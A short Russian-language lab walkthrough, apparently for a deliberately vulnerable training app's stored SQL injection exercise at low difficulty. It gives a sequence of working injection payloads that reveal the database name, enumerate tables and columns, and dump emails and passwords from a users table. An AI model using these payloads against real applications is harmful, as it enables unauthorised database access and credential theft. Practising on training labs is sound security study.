---
title: SQL Injection - Stored (Blog)
sidebar_position: 1
---

# SQL Injection - Stored (Blog)

**(low)**


Payload’ы подряд:
```bash
1', (select database() ))-- -
```
Название базы данных
```bash
1', (select group_concat(table_name)from information_schema.tables where table_schema=database()))-- -
```
Название таблицы
```bash
1', (select group_concat(column_name)from information_schema.columns where table_name='users'))-- -
```
Смотрим таблицу users
```bash
1', (select group_concat(email,password) from users))-- -
```
Смотрим пароли и логины из этой таблицы

![](images/SQL_Injection_-_Stored_Blog_img_1.png)